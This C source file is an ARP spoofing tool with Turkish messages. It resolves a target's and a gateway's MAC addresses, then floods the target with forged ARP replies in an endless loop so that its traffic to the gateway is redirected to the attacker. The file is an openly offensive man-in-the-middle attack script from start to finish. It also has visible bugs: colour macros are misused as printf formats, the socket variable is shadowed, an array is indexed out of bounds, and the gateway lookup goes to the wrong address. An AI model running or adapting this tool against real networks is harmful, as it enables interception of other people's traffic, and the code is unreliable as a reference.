#include<stdio.h>
#include<string.h>

#include<stdlib.h>
#include<stdint.h>

#include<unistd.h>
#include<signal.h>

#include<sys/socket.h>
#include<sys/types.h>
#include<sys/ioctl.h>

#include<arpa/inet.h>

#include<netinet/in.h>
#include<netinet/if_ether.h>

#include<net/if.h>
#include<net/ethernet.h>

#include<netpacket/packet.h>

#define IFACE_ADDRESS_BASE_LOC "/sys/class/net"
#define PKT_LEN 1024
#define ARP_PING_LEN 42


#define kırmızı "\e[41m"
#define yesil "\e[42m"
#define sarı "\e[43m"
#define mavı "\e[44m"
#define beyaz "\e[47m"

#define ykırmızı "\033[31m"
#define yyesil "\033[32m"
#define ysarı "\033[33m"
#define ymavı "\033[34m"

#define reset "\e[0m"


int sockfd;


unsigned int local_ipv4[4]   = {};
unsigned int local_mac[6]    = {};
unsigned int target_ipv4[4]  = {};
unsigned int target_mac[6]   = {};
unsigned int gateway_ipv4[4] = {};
unsigned int gateway_mac[6]  = {};

struct sockaddr_ll device;

int8_t OFFSETS[] = { 6, 22, 28, 32, 38 };

uint8_t arp_ping_packet[ARP_PING_LEN] = { 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,
				  	  0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x08, 0x06, 0x00, 0x01,
0x08, 0x00, 0x06, 0x04, 0x00, 0x01,
				  	  0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
			  	  	  0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
				  	  0x00, 0x00, 0x00, 0x00
};

uint8_t arp_poison_target_packet[ARP_PING_LEN] = { 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
			   		    	   0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x08, 0x06, 0x00, 0x01,
0x08, 0x00, 0x06, 0x04, 0x00, 0x02,
					    	   0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
					    	   0x00, 0x00, 0x00, 0x00,
					    	   0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
					    	   0x00, 0x00, 0x00, 0x00
};

void cleanup() {
	printf(yesil,ykırmızı, "Re-ARPing Hedefleri \n", reset);


	for(int i = 0; i < 6; ++i) {
		arp_poison_target_packet[0+i] = target_mac[i];
		arp_poison_target_packet[OFFSETS[0]+i] = gateway_mac[i];
		arp_poison_target_packet[OFFSETS[1]+i] = gateway_mac[i];
		arp_poison_target_packet[OFFSETS[3]+i] = target_mac[i];
	}
	for(int i = 0; i < 4; ++i) {
		arp_poison_target_packet[OFFSETS[2]+i] = gateway_ipv4[i];
		arp_poison_target_packet[OFFSETS[4]+i] = target_ipv4[4];
	}

	for(int i = 0; i < 10; ++i) {
		sendto(sockfd, arp_poison_target_packet, ARP_PING_LEN, 0, (struct sockaddr*)&device, sizeof(device));
		sleep(3);
	}

	close(sockfd);
	printf("\033[?25h");
	exit(0);

}

int main(int argc, char ** argv) {
	printf("\033[0m");

	if(!argv[1]) {
		printf(mavı,ysarı, "\nArayüz Adı Gerekli\n", yesil,ymavı, "\nKullanımı : $ %s <ARAYÜZ> <HEDEF IP> <BAGLANTI IP>\n\n", argv[0], reset);
		return -1;
	} else if(!argv[2]) {
		printf(mavı,ysarı, "\nHedef İP Adresi Gerekli\n", yesil,ymavı, "\nKullanımı : %s <ARAYÜZ> <HEDEF IP> <BAGLANTI IP>\n\n", argv[0], reset);
		return -1;
	} else if(!argv[3]) {
		printf(mavı,ysarı, "\nBağlantı İP Adresi Gerekli\n", yesil,ymavı, "\nKullanımı : %s <ARAYÜZ> <HEDEF IP> <BAGLANTI IP>\n\n", argv[0], reset);
		return -1;

	}

	char * interface  = argv[1];
	char * target_ip  = argv[2];
	char * gateway_ip = argv[3];

	char   packet_buffer[PKT_LEN*8];
	struct ether_arp * arp = (struct ether_arp*)(packet_buffer + sizeof(struct ether_header));
	struct ifreq ifr;

	int sockfd = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ARP));
	if (sockfd < 0) {
		printf(kırmızı,ysarı, "ERROR : Soket Oluşturulamadı.\n", reset);
		perror("");
		return -1;
	}

	signal(SIGINT, cleanup);

	struct timeval timeout;
	timeout.tv_sec  = 0;
	timeout.tv_usec = 500000;

	setsockopt(sockfd, SOL_SOCKET, SO_RCVTIMEO, (char *)&timeout, sizeof(timeout));

	printf(yesil, "Arayüz Hakkında Ayrıntılı Bilgi Alın...\n", reset);

	
	char address_f_location[128];
	char interface_mac_address[32];
	char ch;
	snprintf(address_f_location, sizeof(address_f_location), "%s/%s/address", IFACE_ADDRESS_BASE_LOC, interface, reset);
	FILE * address_location = fopen(address_f_location, "r");
	if(address_location == NULL) {
		printf(kırmızı,ysarı, "Arayüz için Yerel Mac Adresi Bulunamadı", reset);
		perror("");
		return -1;

	}

	int i = 0;

	while((ch = fgetc(address_location)) != EOF) {
		snprintf(interface_mac_address+i, sizeof(interface_mac_address), "%c", ch, reset);
		++i;
	}
	interface_mac_address[strlen(interface_mac_address)-1] = '\0';

	int tmp_sock = socket(AF_INET, SOCK_DGRAM , 0);
	ifr.ifr_addr.sa_family = AF_INET;
	strncpy(ifr.ifr_name, interface, IFNAMSIZ-1);
	ioctl(tmp_sock, SIOCGIFADDR, &ifr);


	char interface_ip[32];
	strncpy(interface_ip, inet_ntoa(((struct sockaddr_in*)&ifr.ifr_addr)->sin_addr), sizeof(interface_ip));

	printf(mavı,yesil, "Aygıt %s:\n\tIP - %s\n\tMAC - %s\n\n", interface, interface_ip, interface_mac_address, reset);
	printf(beyaz, "Hedef Ayrıntıları Yapılandırılıyor...", reset);



	sscanf(interface_ip, "%d.%d.%d.%d", (unsigned int*)&local_ipv4[0],
					    (unsigned int*)&local_ipv4[1],
					    (unsigned int*)&local_ipv4[2],
					    (unsigned int*)&local_ipv4[3]
	);
	sscanf(interface_mac_address, "%x:%x:%x:%x:%x:%x", (unsigned int *)&local_mac[0],
							   (unsigned int *)&local_mac[1],
							   (unsigned int *)&local_mac[2],
							   (unsigned int *)&local_mac[3],
							   (unsigned int *)&local_mac[4],
							   (unsigned int *)&local_mac[5]
	);

	sscanf(target_ip, "%d.%d.%d.%d", (unsigned int*)&target_ipv4[0],
					 (unsigned int*)&target_ipv4[1],
					 (unsigned int*)&target_ipv4[2],
					 (unsigned int*)&target_ipv4[3]
	);

	sscanf(gateway_ip, "%d.%d.%d.%d", (unsigned int*)&gateway_ipv4[0],
					  (unsigned int*)&gateway_ipv4[1],
					  (unsigned int*)&gateway_ipv4[2],
					  (unsigned int*)&gateway_ipv4[3]
	);

	printf(yesil, "Bitti..\n\n", reset);
	printf(sarı, "ARP Ping isteği Hazırlanıyor...", reset);


	memset(&device, 0, sizeof(device));
	device.sll_ifindex = if_nametoindex(interface);
	device.sll_family  = AF_PACKET;
	device.sll_halen   = htons(ETH_ALEN);
	memcpy(device.sll_addr, local_mac, ETH_ALEN);

	for(int i = 0; i < 6; ++i) {
		arp_ping_packet[OFFSETS[0]+i] = local_mac[i];
		arp_ping_packet[OFFSETS[1]+i] = local_mac[i];
	}
	for(int i = 0; i < 4; ++i) {
		arp_ping_packet[OFFSETS[2]+i] = local_ipv4[i];
		arp_ping_packet[OFFSETS[4]+i] = target_ipv4[i];
	}


	printf(yesil, "Bitti..\n\n", reset);
	printf(mavı, "Hedef Ayrıntıları Alınıyor....", reset);


	if((sendto(sockfd, arp_ping_packet, ARP_PING_LEN, 0, (struct sockaddr*)&device, sizeof(device))) < 0) {
		printf(kırmızı,ysarı, "ARP Ping Gönderilemedi.", reset);
		perror("");
		return -1;
	}

	printf(yesil, "ARP Ping Başarıyla Gönderildi...", reset);
	printf(sarı, "Yanıt Bekliyor..", reset);

	uint8_t arp_reply[1024];
	int recv_stat;

	if((recv_stat = recv(sockfd, arp_reply, sizeof(arp_reply), 0)) < 0) {
		printf("Recv() Başarısız,Yanıt Verilmedi.");
		perror("");
		return -1;
	}

	printf(yesil, "Bitti...", reset);

	for(int i = 0; i < 6; ++i) target_mac[i] = arp_reply[6+i];

	printf(yesil, "Hedef Detayları : \n\tIP  - %s\n\tMAC - %02x:%02x:%02x:%02x:%02x:%02x\n\n", target_ip,
									   target_mac[0],
									   target_mac[1],
									   target_mac[2],
									   target_mac[3],
									   target_mac[4],
									   target_mac[5],
									   reset
	);

	printf(mavı, "Bağlantı Adresi Ayrıntıları Alınıyor...", reset);


	if((sendto(sockfd, arp_ping_packet, ARP_PING_LEN, 0, (struct sockaddr*)&device, sizeof(device))) < 0) {
                printf(kırmızı,ysarı, "ARP Ping Gönderilemedi.", reset);
                perror("");
                return -1;
        }

        printf(yesil, "ARP Ping Başarıyla Gönderildi...", reset);
        printf(sarı, "Yanıt Bekliyor..", reset);


        if((recv_stat = recv(sockfd, arp_reply, sizeof(arp_reply), 0)) < 0) {
	        printf("Recv() Başarısız,Yanıt Verilmedi.");
                perror("");
                return -1;
        }

        printf(yesil, "Bitti...", reset);

	for(int i = 0; i < 6; ++i) gateway_mac[i] = arp_reply[6+i];

	printf(yesil, "Bağlantı Adresi Detayları : \n\tIP  - %s\n\tMAC - %02x:%02x:%02x:%02x:%02x:%02x\n\n", gateway_ip,
									   gateway_mac[0],
									   gateway_mac[1],
									   gateway_mac[2],
									   gateway_mac[3],
									   gateway_mac[4],
									   gateway_mac[5],
									   reset
	);

	for(int i = 0; i < 6; ++i) {
		arp_poison_target_packet[0+i] = target_mac[i];
		arp_poison_target_packet[OFFSETS[0]+i] = local_mac[i];
		arp_poison_target_packet[OFFSETS[1]+i] = local_mac[i];
		arp_poison_target_packet[OFFSETS[3]+i] = target_mac[i];
	}
	for(int i = 0; i < 4; ++i) {
		arp_poison_target_packet[OFFSETS[2]+i] = gateway_ipv4[i];
		arp_poison_target_packet[OFFSETS[4]+i] = target_ipv4[i];
	}

	printf(mavı, "Hedefe Saldırı Başlatıldı...");
	int sent = 1;

	while(1) {
		sendto(sockfd, arp_poison_target_packet, ARP_PING_LEN, 0, (struct sockaddr*)&device, sizeof(device));
		sleep(3);
	}

	return 0;
}




